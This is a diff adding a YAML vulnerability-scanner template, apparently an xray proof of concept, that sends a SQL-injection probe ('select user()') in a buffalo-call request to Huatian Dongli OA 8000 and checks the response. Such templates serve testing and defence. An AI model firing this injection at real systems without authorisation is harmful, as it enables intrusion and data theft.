@@ -1,0 +1,19 @@
+name: poc-yaml-华天动力OA-sqli
+manual: true
+transport: http
+
+rules:
+    r11:
+        request:
+            method: POST
+            path: /OAapp/bfapp/buffalo/workFlowService
+            headers:
+                Content-Type: multipart/form-data
+            body: "<buffalo-call> \r\n<method>getDataListForTree</method> \r\n<string>select user()</string>\r\n</buffalo-call>\r\n\r\n"
+        expression: response.status == 200 && response.body.bcontains(b'user()')
+expression: r11() 
+detail:
+    author: xiaohu
+    links: 
+        - https://www.yuque.com/peiqiwiki/peiqi-poc-wiki/ggwh6v
+    Affected Version: 华天动力OA 8000版
